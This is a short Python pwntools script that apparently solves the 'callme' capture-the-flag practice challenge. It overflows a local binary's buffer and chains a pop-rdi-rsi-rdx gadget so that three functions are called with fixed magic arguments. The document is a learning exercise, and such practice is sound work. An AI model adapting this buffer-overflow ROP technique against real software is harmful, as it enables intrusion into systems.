from pwn import *

sh = process('./callme')

# address
callme_one = p64(0x00400720)    # callme_one
callme_two = p64(0x00400740)    # callme_two
callme_three = p64(0x004006f0)  # callme_three
argu = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

# gadget
pop_rdi_rsi_rdx = p64(0x000000000040093c)    # pop rdi ; pop rsi ; pop rdx ; ret

# payload
payload = b'a'*32 + p64(0xdeadbeef) + pop_rdi_rsi_rdx + argu + callme_one
payload += pop_rdi_rsi_rdx + argu + callme_two
payload += pop_rdi_rsi_rdx + argu + callme_three

sh.sendline(payload)
sh.interactive()
